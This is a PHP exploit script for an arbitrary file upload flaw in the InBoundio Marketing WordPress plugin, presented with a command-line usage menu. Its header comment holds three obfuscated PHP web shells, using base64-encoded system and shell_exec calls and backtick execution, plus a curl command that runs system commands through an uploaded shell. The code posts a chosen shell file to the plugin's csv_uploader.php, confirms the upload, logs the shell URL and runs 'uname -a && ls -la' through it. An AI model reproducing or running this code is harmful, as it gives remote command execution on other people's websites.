<?php

/*
  EXEMPLE SHELL UPLOAD:
  --------------------------------------------------------------------------------
  [+] MODEL-01 CODE >>
  <?php $__=@base64_decode("c3lzdGVt");echo@$__(isset($_REQUEST[0])?$_REQUEST[0]:NULL);?>

  [+] MODEL-02 CODE >>
  <?php echo(`{$_REQUEST[0]}`);?>

  [+] MODEL-03 CODE >>
  <?php $_=$_REQUEST[0];@$__=@create_function('$_',base64_decode("ZWNobyhzaGVsbF9leGVjKCRfKSk7"));@$__($_);

  # EXECUTE:       curl "http://localhost/of.php?0=uname%20-a%20%26%26%20ls%20-la"
  REF: http://pastebin.com/D07wPKmA
  --------------------------------------------------------------------------------
  REF EXPLOIT CODE: http://k3dsec.blogspot.com/2015/03/wordpress-plugin-inboundio-marketing.html
  Vendor : http://www.inboundio.com

 */
error_reporting(1);
set_time_limit(0);
ini_set('display_errors', 1);
ini_set('max_execution_time', 0);
ini_set('allow_url_fopen', 1);
ob_implicit_flush(true);
ob_end_flush();

$op_ = getopt('f:t:', array('help::'));
echo "[+] [Exploit]: WordPress plugin (InBoundio Marketing) Shell Upload Vulnerability / INURL - BRASIL\n";
$menu = "
    -t : SET TARGET.
    -f : SET FILE UPLOAD.
    Execute:
                  php exploit.php -t target -f shell.php
\n";
echo isset($op_['help']) ? exit($menu) : NULL;
$params = array('file' => not_isnull_empty($op_['f']) ? $op_['f'] : exit("\n[x] [ERRO] DEFINE FILE SHELL!\n"), 'host' => not_isnull_empty($op_['t']) ? (strstr($op_['t'], 'http') ?$op_['t'] : "http://{$op_['t']}") : exit("\n[x] [ERRO] DEFINE TARGET!\n"));
$params['line'] = "--------------------------------------------------------------";

function __plus() {
    ob_flush();
    flush();
}

function not_isnull_empty($valor = NULL) {
    RETURN !is_null($valor) && !empty($valor) ? TRUE : FALSE;
}

function __request($params) {
    $objcurl = curl_init();
    curl_setopt($objcurl, CURLOPT_URL, "http://{$params['host']}/wp-content/plugins/inboundio-marketing/admin/partials/csv_uploader.php");
    curl_setopt($objcurl, CURLOPT_USERAGENT, "Mozilla/" . rand(1, 50) . ".0 (compatible; MSIE " . rand(1, 50) . "." . rand(1, 50) . "1; Windows NT " . rand(1, 50) . ".0)");
    curl_setopt($objcurl, CURLOPT_POST, 1);
    curl_setopt($objcurl, CURLOPT_POSTFIELDS, $params['file']);
    curl_setopt($objcurl, CURLOPT_TIMEOUT, 20);
    $info['corpo'] = curl_exec($objcurl) . __plus();
    curl_close($objcurl) . __plus();
    unset($objcurl);
    return $info;
}

__request($params) . __plus();
$_s = "{$params['host']}/wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv/{$params['file']}";
$_h = get_headers($_s, 1) . __plus();
foreach ($_h as $key => $value) {
    echo date("h:m:s") . " [INFO][{$key}]:: {$value}\n";
}
$_x = (strstr(($_h[0] . (isset($_h[1]) ? $_h[1] : NULL)), '200'));
print "\n" . date("h:m:s") . " [INFO][COD]:: " . (!empty($_x) ? '[+] VULL' : '[-] NOT VULL');
print "\n" . date("h:m:s") . " [INFO][SHELL]:: " . (!empty($_x) ? "[+] {$_s}" . file_put_contents("Exploit_AFU.txt", "{$_s}\n\n", FILE_APPEND) : '[-] ERROR!');
print "\n" . date("h:m:s") . " [INFO][INFO]:: " . (!empty($_x) ? file_get_contents("$_s?=uname%20-a%20%26%26%20ls%20-la") : '[x] without shell information');
